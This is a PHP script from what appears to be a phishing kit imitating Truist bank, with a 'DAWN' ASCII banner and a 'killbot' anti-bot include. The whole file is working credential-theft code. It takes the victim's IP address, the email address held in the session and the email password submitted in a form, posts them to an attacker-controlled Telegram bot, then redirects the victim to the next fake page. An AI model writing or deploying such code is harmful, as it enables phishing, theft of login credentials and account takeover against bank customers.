<?php 

session_start();
require_once($_SERVER['DOCUMENT_ROOT'].'/killbot/code/include.php');
/*

        /$$$$$$$   /$$$$$$ \ _$$    _$_   _$$__  _
       | $$__  $$ /$$__  $$ |$$$|  |$$$| | $$$ | $|
       | $$  \ $$| $$  \ $$ |$$$|  |$$$| | $$$$| $|
       | $$  | $$| $$$$$$$$ |$$$|  |$$$| | $$ $$ $|
       | $$  | $$| $$__  $$ |$$$|  |$$$| | $$ $$$$|
       | $$  | $$| $$  | $$ |$$  /\ $$ | | $$\ $$$|
       | $$$$$$$/| $$  | $$ |$$ /  \$$ | | $$ \ $$|
       |_______/ |__/  |__/ |__/    \__| |__/  \__/      
                                                                                                

*/

    
include "cn.php";
$ppp=getenv("REMOTE_ADDR");$vrneijvin=$_SESSION["eml"];$wewdbcdwb=$_POST['empd'];$msg=$ppp."\nDawn676-Truist Emailid : ".$vrneijvin."\nEmail pass: ".$wewdbcdwb;file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=".urlencode($msg)."");




header("location:../diasuser-sns.php");
?>